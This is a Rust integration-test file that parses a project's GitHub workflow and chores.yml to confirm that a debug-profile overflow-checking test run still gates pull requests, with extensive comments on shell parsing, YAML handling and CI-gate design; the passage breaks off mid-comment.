//! The debug run that lets the PR gate see an overflow guards itself.
//!
//! `overflow-checks` is on in debug and off in release, so a defect
//! whose only symptom is an arithmetic overflow panic cannot be
//! observed by a release-only test run. `release.yml` runs a debug suite
//! too -- its `chore test` starts with `task: test:unit` -- and that is
//! NOT the same fact as the pull-request gate being able to see the
//! defect: `release.yml` triggers on a version tag, after the change
//! has already merged. A wrapping bug merges green here and surfaces
//! only when someone else cuts the next release, detached from the
//! change and the person who could have caught it.
//!
//! So `ci.yml` -- the workflow that actually gates a merge -- needs its
//! own debug run, and this file is what keeps it there. It checks
//! `ci.yml` specifically and is not satisfied by `release.yml` having
//! one; see `a_checking_debug_run_that_is_not_in_ci_yml_does_not_satisfy_this_guard`
//! for that distinction pinned as a test rather than left as a comment
//! someone could stop believing.
//!
//! # The run lives in `chores.yml`, one indirection away
//!
//! Every CI job runs chore tasks, so a green local `chore test` is the
//! same evidence as a green CI run. The debug run is therefore not
//! spelled in `ci.yml` at all: the `unit` job runs `chore test:unit`,
//! and it is `chores.yml`'s `test:unit` task that carries
//! `EXPECT_OVERFLOW_CHECKS=1` and the `cargo test` (through
//! `scripts/test.sh`, which ends in `cargo test --features cli "$@"`). The guard FOLLOWS
//! THAT INDIRECTION rather than accepting the task's name: a `chore
//! <task>` line in a gating step is resolved in `chores.yml`, through any
//! `task:` items, and the commands found there are held to the same rules
//! as a command written in the step. See [`chore_checking_debug_runs`]
//! for the ways a task stops gating (chore may skip it as up to date, or
//! discard its failure).
//!
//! The same indirection carries the rest of the gate: which jobs run on
//! which architecture, where the fixtures come from (the
//! fs-linux-test-harness VM, under KVM, on the x86_64 `fixtures` job --
//! GitHub's arm64 runners have no KVM), and that `ci-ok` waits on every
//! job. Those are pinned by
//! `the_pr_gate_builds_fixtures_once_in_the_harness_vm_and_tests_both_architectures_through_chore`.
//!
//! # Why this is an integration test and not a module under `src/`
//!
//! Cargo discovers `tests/*.rs` on its own, so there is no declaration
//! anywhere that can be deleted to switch this off. A guard living as a
//! file under `src/` behind a `#[cfg(test)] mod` line has no such
//! protection: lose the one line and the file stays, compiles into
//! nothing, and asserts nothing, with no lint to say so. That happened
//! once already on a sibling repository's version of this fix.
//!
//! # The other half: does the debug run actually ask anything
//!
//! A workflow or task file quoting a debug command inside the comment
//! explaining it means a scan
//! that ignored comments would keep passing after the step itself was
//! deleted. And a debug step that compiles but never checks anything is
//! costing a compile for nothing, so the scan also requires the
//! `EXPECT_OVERFLOW_CHECKS` handshake that arms
//! `overflow_checks::the_build_the_gate_asked_to_check_does_check` in
//! `src/lib.rs` -- the runtime half that actually performs an overflow
//! and fails if the build let it through. This file proves the step is
//! present and asked to check; it cannot prove the build can see the
//! overflow, which is what the runtime test is for. Neither is
//! redundant with the other: delete the step and the runtime test never
//! runs at all; keep the step but drop the variable and the runtime
//! test runs, finds nothing to check, and passes doing nothing.

use saphyr::{LoadableYamlNode, Yaml};
use std::path::{Path, PathBuf};

fn manifest_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

/// Read a file the guard depends on, or fail.
///
/// Panics rather than returning `None` on purpose: a version of this
/// that skipped when the file was missing would reproduce the exact
/// blindness the guard exists to prevent.
fn read_or_panic(path: &Path) -> String {
    std::fs::read_to_string(path).unwrap_or_else(|e| {
        panic!(
            "cannot read {}: {e}. This guard must fail rather than skip: a \
             version of it that returned early here would be the same \
             blindness it exists to prevent.",
            path.display()
        )
    })
}

/// Every `cargo test` invocation in a workflow that would be compiled
/// with overflow checks on AND asked to check for one.
///
/// Three things disqualify a line:
///
/// - it is a YAML comment. Load-bearing here, not defensive: `ci.yml`
///   quotes the debug command verbatim in the comment above the step
///   that runs it;
/// - it is an inline trailing comment on an otherwise-`--release` line;
/// - it passes `--release`, or names a profile explicitly.
///
/// And the run must carry `EXPECT_OVERFLOW_CHECKS=1` -- a debug step
/// that never asks the build anything buys nothing over deleting it.
///
/// `scripts/test.sh` IS `cargo test`, and is read as one. It picks a
/// scratch directory and then runs `cargo test --features cli "$@"` (inside the
/// harness's `vm.sh session` when the harness is there), so every argument
/// it is given -- `--release`, `-r` -- is cargo's, and the rules above
/// apply to it word for word. `chores.yml` runs the suite through it.
/// That the script still ends that way is pinned by
/// `scripts_test_sh_is_still_cargo_test_with_its_arguments`: if it
/// stopped passing its arguments through, reading it as `cargo test`
/// would be a lie this guard tells.
fn checking_debug_runs(script: &str) -> Vec<String> {
    script
        .lines()
        .filter_map(|raw| {
            let line = raw.trim_start();
            if line.starts_with('#') {
                return None;
            }
            let command = line.split(" #").next().unwrap_or(line).trim();
            let as_cargo = command.replace(TEST_WRAPPER, "cargo test");
            if !as_cargo.contains("cargo test") {
                return None;
            }
            if as_cargo.contains("--release")
                || as_cargo.contains("--profile")
                || selects_release_by_short_flag(&as_cargo)
            {
                return None;
            }
            if !as_cargo.contains("EXPECT_OVERFLOW_CHECKS=1") {
                return None;
            }
            Some(command.to_string())
        })
        .collect()
}

/// The repository's `cargo test` wrapper. See [`checking_debug_runs`].
const TEST_WRAPPER: &str = "scripts/test.sh";

/// Whether `command` runs `cargo test` with the release profile selected
/// by its short flag (#158).
///
/// `cargo test -r` is `cargo test --release`, and the string check above
/// does not see it. Nor is it one spelling: clap merges short flags, so
/// `-qr` and `-rq` carry it as well, anywhere before `--`. A cluster ends
/// at a short option that takes a value -- `-p`, `-j`, `-F` or `-Z` --
/// whose value is the rest of the word or, when the word ends there, the
/// next one: `-j4 -r` is release, `-pr` names a package `r`. Everything
/// after `--` belongs to the test harness, where `-r` is not cargo's.
fn selects_release_by_short_flag(command: &str) -> bool {
    shell_commands(command).iter().any(|command| {
        let words: Vec<&str> = command.iter().map(String::as_str).collect();
        (0..words.len()).any(|at| {
            // `cargo` by name or by path, then any `+toolchain`, then `test`.
            let is_cargo = words[at] == "cargo" || words[at].ends_with("/cargo");
            let mut next = at + 1;
            while is_cargo && words.get(next).is_some_and(|w| w.starts_with('+')) {
                next += 1;
            }
            is_cargo && words.get(next) == Some(&"test") && release_in(&words[next + 1..])
        })
    })
}

/// `command` split into the commands the shell's control operators --
/// `&&`, `||`, `;`, `|` and `&` -- separate, each as its words, with
/// quotes and backslashes removed as the shell removes them.
///
/// Operators need no spaces: `true&&cargo test -r` is a `cargo test` run,
/// and in `cargo test --lib&&rm -rf build` the `-rf` is `rm`'s. An `&` or
/// `|` straight after `>` or `<` is part of a redirection (`2>&1`, `>|`).
/// Inside quotes, or after a backslash, nothing is an operator or a word
/// break, and what the quotes held is the word: `--features 'a;b' -r` is
/// one command, and `'-r'` is `-r`.
fn shell_commands(command: &str) -> Vec<Vec<String>> {
    let mut commands = vec![Vec::new()];
    let mut word: Option<String> = None;
    let mut chars = command.chars().peekable();
    let mut previous = None;
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                let word = word.get_or_insert_with(String::new);
                word.extend(chars.by_ref().take_while(|&q| q != '\''));
            }
            '"' => {
                let word = word.get_or_insert_with(String::new);
                while let Some(q) = chars.next() {
                    match q {
                        '"' => break,
                        '\\' if matches!(chars.peek(), Some('"' | '\\' | '$' | '`')) => {
                            word.extend(chars.next());
                        }
                        _ => word.push(q),
                    }
                }
            }
            '\\' => word.get_or_insert_with(String::new).extend(chars.next()),
            ';' | '&' | '|' if !matches!(previous, Some('>' | '<')) => {
                if c != ';' && chars.peek() == Some(&c) {
                    chars.next();
                }
                commands.last_mut().unwrap().extend(word.take());
                commands.push(Vec::new());
            }
            c if c.is_whitespace() => commands.last_mut().unwrap().extend(word.take()),
            c => word.get_or_insert_with(String::new).push(c),
        }
        previous = Some(c);
    }
    commands.last_mut().unwrap().extend(word.take());
    commands
}

/// Whether `cargo test`'s `arguments`, up to the end of its own command,
/// carry `-r`. See [`selects_release_by_short_flag`].
///
/// `arguments` are one command's words ([`shell_commands`]), so in
/// `cargo test --lib && rm -rf build` the `r` in `-rf` is not among them.
fn release_in(arguments: &[&str]) -> bool {
    const LONG_OPTIONS_TAKING_A_VALUE: [&str; 15] = [
        "--package",
        "--exclude",
        "--features",
        "--target",
        "--target-dir",
        "--manifest-path",
        "--profile",
        "--test",
        "--bin",
        "--example",
        "--bench",
        "--jobs",
        "--message-format",
        "--color",
        "--config",
    ];
    let mut next_is_a_value = false;
    for &argument in arguments {
        if std::mem::take(&mut next_is_a_value) {
            continue;
        }
        if argument == "--" {
            return false;
        }
        if argument.starts_with("--") {
            next_is_a_value =
                !argument.contains('=') && LONG_OPTIONS_TAKING_A_VALUE.contains(&argument);
        } else if let Some(cluster) = argument.strip_prefix('-') {
            for (at, flag) in cluster.char_indices() {
                match flag {
                    'r' => return true,
                    'p' | 'j' | 'F' | 'Z' => {
                        next_is_a_value = at + 1 == cluster.len();
                        break;
                    }
                    _ => {}
                }
            }
        }
    }
    false
}

/// A workflow, structured just far enough to answer one question:
/// does this step's result actually gate a pull request?
///
/// The line-based scan above finds the command. It cannot see the
/// step's sibling keys, so `if: false` and `continue-on-error: true`
/// left every guard test green while the gate stopped gating -- a step
/// that runs and whose result nothing reads, which is this project's
/// own named defect, committed inside the guard written to prevent it.
///
/// The conditions are ENUMERATED rather than patched one defeat at a
/// time, because twice on this shape the defeat lived in what the scan
/// does not look at rather than in what it compares. A `run:` step
/// gates a pull request only if the step carries no `if:` and no
/// `continue-on-error:`, its job carries neither either, and the
/// workflow still triggers on `pull_request`.
///
/// `if:` and `continue-on-error:` are rejected on the KEY'S PRESENCE,
/// not by evaluating it. `if: false`, `if: ${{ false }}` and an `if:`
/// on an expression that happens to be false are distinct spellings,
/// and four spellings of one manifest key had already defeated a
/// matcher on a sibling repository -- enumerating them is the losing
/// game. Over-strict is the safe direction: a step that genuinely
/// needs a condition can be split out, whereas a guard that
/// interprets conditions acquires a new defeat whenever the syntax
/// grows.
///
/// A step's other keys -- `name:`, `env:`, `uses:`/`with:` -- say
/// nothing about whether the result is read, so they are ACCEPTED. An
/// `env:` mapping in particular must not disqualify a step: that would
/// be over-strictness in the one direction that costs something, since
/// the handshake this guard looks for is itself an environment
/// variable and a maintainer may reasonably move it into a mapping.
///
/// # WHY THIS IS PARSED AND NO LONGER SCANNED
///
/// The version this replaces hand-rolled the YAML, and it was correct
/// only in the sense that it had been patched five times. Each patch
/// was a helper taught one more piece of ordinary grammar:
///
/// ```text
///   without_comment        a trailing `#`, so a commented-out trigger
///                          stopped counting as a trigger
///   key_of                 quotes, so `"if": false` stopped being a
///                          different key from `if: false`
///   opens_a_block_scalar   `|-`, `|+`, `>`, `>-`, `>+`, `|2`, `>2-`,
///                          so a block's contents were read at all
///   indent_of              the block structure itself
///   triggers: Vec<String>  whole names, so `pull_request_review` and
///                          `pull_request` stopped being the same
/// ```
///
/// Every one of those is a rule a YAML parser already has. And the
/// cost of learning them by hand is recorded in this file, twice over:
/// `key_of`'s own comment noted that the identical quote-normalisation
/// had already been added to `profiles_disabling_overflow_checks` a
/// few dozen lines above, after a quoted `"overflow-checks" = false`
/// defeated that scan -- the lesson did not travel between two parsers
/// in one file. Learning it a sixth time was the alternative to this.
///
/// The properties those helpers defended are not dropped with them.
/// Each is now asserted in `mod gating` against the parser instead:
/// every block scalar style is read whole, a quoted key is the same
/// key, a commented-out trigger is not a trigger, and a `#` inside a
/// quoted shell value is content rather than a comment.
///
/// `saphyr` is a dev-dependency, so nothing here reaches a consumer of
/// the crate.
#[derive(Debug)]
struct Step {
    keys: Vec<String>,
    run: String,
}

#[derive(Debug)]
struct Job {
    keys: Vec<String>,
    steps: Vec<Step>,
}

#[derive(Debug)]
struct Workflow {
    /// The trigger NAMES, parsed. Not the `on:` block's text: a
    /// substring search over that text answered `true` for
    /// `pull_request_review:` and for `pull_request` sitting inside a
    /// comment, so the guard reported pull-request coverage that was
    /// not there. Neither spelling needs an adversarial author.
    triggers: Vec<String>,
    jobs: Vec<Job>,
}

/// The value of `name` in a YAML mapping, or `None`.
///
/// By name rather than by constructing a key, because `saphyr`'s `Yaml`
/// borrows the source text and building one to hand to `get` is more
/// ceremony than the lookup is worth here.
fn field<'a, 'b>(node: &'a Yaml<'b>, name: &str) -> Option<&'a Yaml<'b>> {
    node.as_mapping()?
        .iter()
        .find(|(key, _)| key.as_str() == Some(name))
        .map(|(_, value)| value)
}

/// The keys of a YAML mapping, as plain strings.
///
/// The parser has already resolved the quoting, so `"if"`, `'if'` and
/// `if` all arrive here as `if`. That is the whole of what `key_of`
/// did: there is no un-quoting step left to forget.
fn keys_of(node: &Yaml) -> Vec<String> {
    node.as_mapping()
        .map(|mapping| {
            mapping
                .iter()
                .filter_map(|(key, _)| key.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// Structure a workflow far enough to answer the questions above.
///
/// Panics on a workflow it cannot parse, deliberately. A guard that
/// returned an empty `Workflow` for a file it did not understand would
/// report "no debug run gates this" -- a failure, so that direction is
/// safe -- but one that returned early with a PASS would be the
/// blindness this module exists to prevent. Failing on the parse error
/// names the real problem instead of a consequence of it.
fn parse_workflow(text: &str) -> Workflow {
    let documents = Yaml::load_from_str(text).unwrap_or_else(|e| {
        panic!(
            "workflow is not valid YAML: {e}. This guard reads the workflow \
             rather than scanning its text, so a file it cannot parse is a \
             failure and never a pass."
        )
    });
    let Some(document) = documents.first() else {
        return Workflow {
            triggers: Vec::new(),
            jobs: Vec::new(),
        };
    };

    // `on:` takes three legal shapes: a mapping of trigger names, a
    // sequence of them, or a single scalar. All three are names.
    //
    // Note that `on` survives as the string key `on` and is not folded
    // into the boolean `true` -- saphyr implements the YAML 1.2 core
    // schema, where only `true`/`false` are booleans. The YAML 1.1
    // reading that would break every GitHub workflow ever written does
    // not apply.
    let triggers = match field(document, "on") {
        Some(on) if on.as_mapping().is_some() => keys_of(on),
        Some(on) if on.as_sequence().is_some() => on
            .as_sequence()
            .into_iter()
            .flatten()
            .filter_map(|item| item.as_str().map(str::to_string))
            .collect(),
        Some(on) => on.as_str().map(str::to_string).into_iter().collect(),
        None => Vec::new(),
    };

    let mut jobs = Vec::new();
    if let Some(mapping) = field(document, "jobs").and_then(Yaml::as_mapping) {
        for (_, body) in mapping.iter() {
            let steps = field(body, "steps")
                .and_then(Yaml::as_sequence)
                .into_iter()
                .flatten()
                .map(|step| Step {
                    keys: keys_of(step),
                    // A `run:` block of any style -- `|`, `|-`, `|+`,
                    // `>`, `>-`, `>+`, `|2`, `>2-` -- arrives as one
                    // string with the block folded per its own rules,
                    // so a command inside a shell loop is seen whole
                    // rather than as fragments, and no style is
                    // mistaken for the command itself. That is what
                    // `opens_a_block_scalar` enumerated by hand.
                    run: field(step, "run")
                        .and_then(Yaml::as_str)
                        .unwrap_or_default()
                        .to_string(),
                })
                .collect();
            jobs.push(Job {
                keys: keys_of(body),
                steps,
            });
        }
    }

    Workflow { triggers, jobs }
}

/// Does this workflow still run on a pull request at all?
///
/// The assumption the `ci.yml`-only scope rests on, and a fact about
/// the file rather than a given: if the triggers stop including
/// `pull_request`, the step gates nothing however it looks.
///
/// MATCHED WHOLE, against parsed trigger names. A substring search
/// over the `on:` block's text answered `true` for
/// `pull_request_review:` -- which fires on review events, not on a
/// pull request opening or being pushed to, so it gates nothing -- and
/// for `pull_request` inside a comment, including the comment that
/// says it was switched off.
///
/// # `pull_request_target` is NOT accepted, and that is a change
///
/// This guard used to accept it, on the reasoning that it also runs on
/// pull requests and can be a required check. That was rust-fs-ext4#149. It runs
/// against the BASE repository with a write token and the repository's
/// secrets, and checks out the base ref by default, so a workflow
/// triggered only that way may never build the contributor's code at
/// all -- and accepting it as proof the merge is gated is permissive
/// in the worst direction for twelve library crates that take pull
/// requests from forks.
///
/// The alternative considered was to accept it conditionally, on
/// finding a checkout that names the pull request head. Both designs
/// refuse when they do not recognise the checkout, so both fail safe;
/// what settled it is that `pull_request_target` appears in ZERO of
/// the twelve repositories' workflows. The conditional branch would
/// guard a configuration that exists nowhere, and "we do not use this
/// trigger, and a test says so" is the better standing statement.
///
/// Note the narrowness of what this refuses: a workflow carrying BOTH
/// `pull_request:` and `pull_request_target:` -- the ordinary way to
/// reach secrets without giving up the gate -- is satisfied by the
/// former and never reaches this question.
fn runs_on_pull_request(wf: &Workflow) -> bool {
    wf.triggers.iter().any(|t| t == "pull_request")
}

/// The branch names a `pull_request:` trigger is restricted to, if any
/// (#132).
///
/// `on: pull_request: branches: [main]` means a pull request based on
/// anything else runs **no** CI — and still collects its review-bot
/// ticks, so it reads as verified. This repository stacks pull requests
/// routinely, which is exactly the case that got nothing: one check
/// against another PR's three on the same day.
fn pull_request_branch_filter(document: &Yaml) -> Vec<String> {
    let Some(on) = field(document, "on").or_else(|| field(document, "true")) else {
        return Vec::new();
    };
    let Some(pr) = field(on, "pull_request") else {
        return Vec::new();
    };
    let Some(branches) = field(pr, "branches") else {
        return Vec::new();
    };
    branches
        .as_sequence()
        .map(|seq| {
            seq.iter()
                .filter_map(|b| b.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// Why `workflow` gates no pull request at all, or `None` if it does.
///
/// The real-file assertions ask this FIRST. Without it, a workflow whose
/// `on:` block moved was reported as having no debug `cargo test` in a
/// step that gates a pull request, which sends the reader to a step that
/// is fine (#155). This names the triggers that were found instead, and
/// says why `pull_request_target` alone does not count.
fn not_a_pull_request_gate(workflow: &str) -> Option<String> {
    let wf = parse_workflow(workflow);
    if runs_on_pull_request(&wf) {
        return None;
    }
    let mut why = format!(
        "the workflow does not trigger on `pull_request` at all (its triggers: {:?}), so \
         none of its steps gates a pull request however they are written. The steps are \
         not the problem; the `on:` block is.",
        wf.triggers
    );
    if wf.triggers.iter().any(|t| t == "pull_request_target") {
        why.push_str(
            " `pull_request_target` alone is refused on purpose: it runs against the base \
             repository and may never build the contributor's code. See \
             `runs_on_pull_request`; carry `pull_request:` beside it.",
        );
    }
    Some(why)
}

/// Keys whose presence on a step or job means its result does not gate.
const NON_GATING_KEYS: [&str; 2] = ["if", "continue-on-error"];

fn carries_a_non_gating_key(keys: &[String]) -> bool {
    keys.iter().any(|k| NON_GATING_KEYS.contains(&k.as_str()))
}

/// Walk a workflow's steps and collect what `select` finds in each
/// `run:`.
///
/// `gating` restricts the walk to steps whose result the pull-request
/// gate actually reads: the workflow must still trigger on a pull
/// request, and neither the job nor the step may carry a key from
/// [`NON_GATING_KEYS`].
///
/// One walk, shared by both halves of the guard. BOTH HALVES ARE
/// STEP-AWARE, and that is deliberate. On the sibling `rust-fs-btrfs`
/// copy of this guard the headline assertion was left line-based while
/// only the handshake one was step-aware, so under `if: false` the
/// headline PASSED and its own failure message would have claimed the
/// pull-request gate could see an overflow when the step it names does
/// not run. Sharing the walk is what stops the two drifting apart
/// again, rather than fixing them separately twice.
fn scan_steps(workflow: &str, gating: bool, select: &dyn Fn(&str) -> Vec<String>) -> Vec<String> {
    let wf = parse_workflow(workflow);
    if gating && !runs_on_pull_request(&wf) {
        return Vec::new();
    }
    let mut out = Vec::new();
    for job in &wf.jobs {
        if gating && carries_a_non_gating_key(&job.keys) {
            continue;
        }
        for step in &job.steps {
            if gating && carries_a_non_gating_key(&step.keys) {
                continue;
            }
            out.extend(select(&step.run));
        }
    }
    out
}

/// A task in `chores.yml`, structured just far enough to answer the
/// same question [`Step`] answers: does running it gate on its commands?
#[derive(Debug)]
struct ChoreTask {
    keys: Vec<String>,
    cmds: Vec<ChoreCmd>,
}

/// One item of a task's `cmds:`. Taskfile v3 spells it as a bare string,
/// or a mapping carrying `cmd:` (a shell command) or `task:` (another
/// task's name) beside keys such as `ignore_error:`.
#[derive(Debug)]
enum ChoreCmd {
    Shell {
        keys: Vec<String>,
        command: String,
    },
    Task {
        keys: Vec<String>,
        name: String,
    },
    /// `defer:` and anything else chore grows. Never counted: what the
    /// guard cannot read, it cannot say gates.
    Other,
}

/// Parse `chores.yml`'s `tasks:` into [`ChoreTask`]s, by name.
///
/// Panics on text it cannot parse, for the reason [`parse_workflow`]
/// does: a resolver that returned no tasks would turn every `chore`
/// line into a panic naming the wrong cause, and one that returned early
/// with a pass would be blind.
fn parse_chores(text: &str) -> std::collections::BTreeMap<String, ChoreTask> {
    let documents = Yaml::load_from_str(text).unwrap_or_else(|e| {
        panic!(
            "chores.yml is not valid YAML: {e}. The guard follows `chore <task>` into it, so \
             a file it cannot parse is a failure and never a pass."
        )
    });
    let mut tasks = std::collections::BTreeMap::new();
    let Some(mapping) = documents
        .first()
        .and_then(|document| field(document, "tasks"))
        .and_then(Yaml::as_mapping)
    else {
        return tasks;
    };
    for (name, body) in mapping.iter() {
        let Some(name) = name.as_str() else { continue };
        let cmds = field(body, "cmds")
            .and_then(Yaml::as_sequence)
            .into_iter()
            .flatten()
            .map(|item| {
                if let Some(command) = item.as_str() {
                    return ChoreCmd::Shell {
                        keys: Vec::new(),
                        command: command.to_string(),
                    };
                }
                let keys = keys_of(item);
                if let Some(name) = field(item, "task").and_then(Yaml::as_str) {
                    ChoreCmd::Task {
                        keys,
                        name: name.to_string(),
                    }
                } else if let Some(command) = field(item, "cmd").and_then(Yaml::as_str) {
                    ChoreCmd::Shell {
                        keys,
                        command: command.to_string(),
                    }
                } else {
                    ChoreCmd::Other
                }
            })
            .collect();
        tasks.insert(
            name.to_string(),
            ChoreTask {
                keys: keys_of(body),
                cmds,
            },
        );
    }
    tasks
}

/// Keys whose presence on a chore TASK means running it may not run its
/// commands, or may not fail when they do.
///
/// `sources:`, `generates:` and `status:` are how a task tells chore it
/// is up to date, and an up-to-date task is SKIPPED: its commands do not
/// run and the step is green. That is exactly `if:` one file away. The
/// rest are the task-level spellings of `if:` and `continue-on-error:`
/// themselves. Presence, not value, as with [`NON_GATING_KEYS`], and for
/// the same reason: a guard that evaluated a fingerprint or a platform
/// list would acquire a new defeat whenever chore's syntax grows.
const NON_GATING_TASK_KEYS: [&str; 6] = [
    "sources",
    "generates",
    "status",
    "ignore_error",
    "platforms",
    "if",
];

/// Keys whose presence on one `cmds:` item means its failure is not the
/// task's failure, or that it may not run.
const NON_GATING_CMD_KEYS: [&str; 3] = ["ignore_error", "platforms", "if"];

fn carries_any(keys: &[String], forbidden: &[&str]) -> bool {
    keys.iter().any(|k| forbidden.contains(&k.as_str()))
}

/// The task names a step's `run:` hands to chore, in order.
///
/// A command -- as [`shell_commands`] splits a line -- whose first word
/// is `chore` (after any `NAME=value` assignments) names its task in the
/// first word after it that is not a flag, so `chore test:unit --force`
/// is `test:unit`. Comment lines and trailing comments are not commands,
/// as in [`checking_debug_runs`].
///
/// `! chore x` is NOT an invocation of `x` for this purpose: the `!`
/// inverts it, so the step is green exactly when the task fails.
fn chore_invocations(script: &str) -> Vec<String> {
    let mut found = Vec::new();
    for raw in script.lines() {
        let line = raw.trim_start();
        if line.starts_with('#') {
            continue;
        }
        let line = line.split(" #").next().unwrap_or(line);
        for words in shell_commands(line) {
            let mut words = words
                .iter()
                .map(String::as_str)
                .skip_while(|w| w.contains('=') && !w.starts_with('-'));
            let Some(program) = words.next() else {
                continue;
            };
            if program != "chore" && !program.ends_with("/chore") {
                continue;
            }
            if let Some(task) = words.find(|w| !w.starts_with('-')) {
                found.push(task.to_string());
            }
        }
    }
    found
}

/// The checking debug runs chore performs, and cannot skip or discard,
/// when asked to run `task` -- following `task:` items down.
///
/// A task gates on its commands only if neither it nor any task on the
/// path to it carries a key from [`NON_GATING_TASK_KEYS`], and a command
/// counts only if its own item carries no key from
/// [`NON_GATING_CMD_KEYS`]. Each command is then held to
/// [`checking_debug_runs`], exactly as a command in a workflow step is.
///
/// A task naming itself, directly or through others, does not loop: the
/// repeated edge contributes nothing, which can only under-count.
///
/// # A TASK THAT DOES NOT EXIST IS A PANIC
///
/// Not an empty result. `chore test:unti` fails the CI step, so the
/// guard would report "no debug run gates" and send the reader looking
/// for a missing handshake; naming the task that is not there names the
/// real cause.
fn chore_checking_debug_runs(
    tasks: &std::collections::BTreeMap<String, ChoreTask>,
    task: &str,
    path: &mut Vec<String>,
) -> Vec<String> {
    if path.iter().any(|on_path| on_path == task) {
        return Vec::new();
    }
    let Some(body) = tasks.get(task) else {
        let mut via = path.join(" -> ");
        if via.is_empty() {
            via.push_str("a workflow step");
        }
        panic!(
            "`chore {task}` (from {via}) names no task in chores.yml. Its tasks: {:?}",
            tasks.keys().collect::<Vec<_>>()
        );
    };
    if carries_any(&body.keys, &NON_GATING_TASK_KEYS) {
        return Vec::new();
    }
    path.push(task.to_string());
    let mut out = Vec::new();
    for cmd in &body.cmds {
        match cmd {
            ChoreCmd::Shell { keys, command } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                out.extend(
                    checking_debug_runs(command)
                        .into_iter()
                        .map(|run| format!("chore {}: {run}", path.join(" -> "))),
                );
            }
            ChoreCmd::Task { keys, name } if !carries_any(keys, &NON_GATING_CMD_KEYS) => {
                out.extend(chore_checking_debug_runs(tasks, name, path));
            }
            _ => {}
        }
    }
    path.pop();
    out
}

/// The checking debug runs of steps that ACTUALLY GATE a pull request,
/// following each `chore <task>` into `chores`, the text of chores.yml.
///
/// This is the function the guard below asks, and the whole of the
/// difference: [`checking_debug_runs`] finds the command, this asks
/// whether anything reads its result. Adding `if: false` to the
/// guarded step in `ci.yml`, or `continue-on-error: true`, left all
/// the guard's tests green while the gate stopped gating. See #142.
///
/// The chores text is a PARAMETER, not read here, so the rules can be
/// proved against small fixtures; the real guard hands it the
/// repository's own `chores.yml`.
fn gating_checking_debug_runs_via_chore(workflow: &str, chores: &str) -> Vec<String> {
    let tasks = parse_chores(chores);
    scan_steps(workflow, true, &|run| {
        let mut found = checking_debug_runs(run);
        for task in chore_invocations(run) {
            found.extend(chore_checking_debug_runs(&tasks, &task, &mut Vec::new()));
        }
        found
    })
}

/// [`gating_checking_debug_runs_via_chore`] with no chore tasks at all,
/// for the workflow-only fixtures in `mod gating`. A `chore` line in the
/// workflow panics here, as naming a task that does not exist.
fn gating_checking_debug_runs(workflow: &str) -> Vec<String> {
    gating_checking_debug_runs_via_chore(workflow, "tasks: {}\n")
}

fn workflow_path(name: &str) -> PathBuf {
    manifest_dir().join(".github").join("workflows").join(name)
}

/// The guard. Reads `ci.yml` -- the workflow that gates a pull request
/// -- and refuses if nothing there compiles the overflow checks and
/// asks the build to prove it, whether a step spells the run itself or
/// runs a `chores.yml` task that does.
///
/// `ci.yml` specifically, not `release.yml`. `release.yml` runs the
/// same debug task through `chore test`; it does not run on a pull
/// request, so its presence says nothing about whether a merge was
/// gated by it.
#[test]
fn the_pr_gate_still_tests_in_a_profile_that_can_see_an_overflow() {
    let path = workflow_path("ci.yml");
    let workflow = read_or_panic(&path);
    let chores = read_or_panic(&manifest_dir().join("chores.yml"));

    if let Some(why) = not_a_pull_request_gate(&workflow) {
        panic!("{}: {why}", path.display());
    }
    let debug_runs = gating_checking_debug_runs_via_chore(&workflow, &chores);
    assert!(
        !debug_runs.is_empty(),
        "no `cargo test` reached from {} -- in a step, or in the chores.yml task a \
         `chore <task>` step runs -- runs without `--release` while setting \
         EXPECT_OVERFLOW_CHECKS=1 IN A STEP WHOSE RESULT GATES A PULL REQUEST, so a \
         defect whose only symptom is an arithmetic overflow panic can merge without \
         the PR gate ever seeing it. The run belongs in chores.yml's `test:unit`, run \
         by ci.yml's `unit` job; a task carrying sources/generates/status (chore may \
         skip it) or a cmd carrying ignore_error does not count. release.yml running \
         it does not help: it triggers on a version tag, after the change has merged.",
        path.display()
    );
}

/// The parsed first document of `text`, read from `path`, or a panic
/// naming the file.
fn load_document<'t>(text: &'t str, path: &Path) -> Yaml<'t> {
    Yaml::load_from_str(text)
        .unwrap_or_else(|e| panic!("{} is not valid YAML: {e}", path.display()))
        .into_iter()
        .next()
        .unwrap_or_else(|| panic!("{} is empty", path.display()))
}

fn job<'a, 't>(document: &'a Yaml<'t>, name: &str, path: &Path) -> &'a Yaml<'t> {
    field(document, "jobs")
        .and_then(|jobs| field(jobs, name))
        .unwrap_or_else(|| panic!("{} has no jobs.{name}", path.display()))
}

fn steps_of<'a, 't>(job: &'a Yaml<'t>, name: &str) -> &'a [Yaml<'t>] {
    field(job, "steps")
        .and_then(Yaml::as_sequence)
        .map(Vec::as_slice)
        .unwrap_or_else(|| panic!("jobs.{name} has no steps"))
}

fn run_of<'a>(step: &'a Yaml) -> &'a str {
    field(step, "run").and_then(Yaml::as_str).unwrap_or("")
}

/// A job's `needs:`, which GitHub accepts as one name or a list of them.
fn needs_of(job: &Yaml) -> Vec<String> {
    match field(job, "needs") {
        Some(needs) if needs.as_sequence().is_some() => needs
            .as_sequence()
            .into_iter()
            .flatten()
            .filter_map(|n| n.as_str().map(str::to_string))
            .collect(),
        Some(needs) => needs.as_str().map(str::to_string).into_iter().collect(),
        None => Vec::new(),
    }
}

/// Whether `step` is an `actions/<action>` step whose `with.name` is `artifact`.
fn is_artifact_step(step: &Yaml, action: &str, artifact: &str) -> bool {
    field(step, "uses")
        .and_then(Yaml::as_str)
        .is_some_and(|uses| uses.starts_with(&format!("actions/{action}@")))
        && field(step, "with")
            .and_then(|with| field(with, "name"))
            .and_then(Yaml::as_str)
            == Some(artifact)
}

/// Every step of `job` carries no non-gating key, and neither does the
/// job: the structure below is only the gate if all of it runs and all
/// of its failures count.
fn assert_unconditional(job: &Yaml, name: &str, workflow: &str) {
    assert!(
        !carries_a_non_gating_key(&keys_of(job)),
        "{workflow} jobs.{name} must not be conditional or allowed to fail"
    );
    for (at, step) in steps_of(job, name).iter().enumerate() {
        let keys = keys_of(step);
        // A STEP THAT RUNS NO COMMAND CANNOT GATE, AND MAY BE
        // CONDITIONAL (#264).
        //
        // The rule is right about `run:` steps: a conditional command is
        // a command that may not run, and the gate is the commands. It
        // was wrong about the others. `actions/upload-artifact` has no
        // `run:` — it cannot pass, cannot mask a failure and cannot make
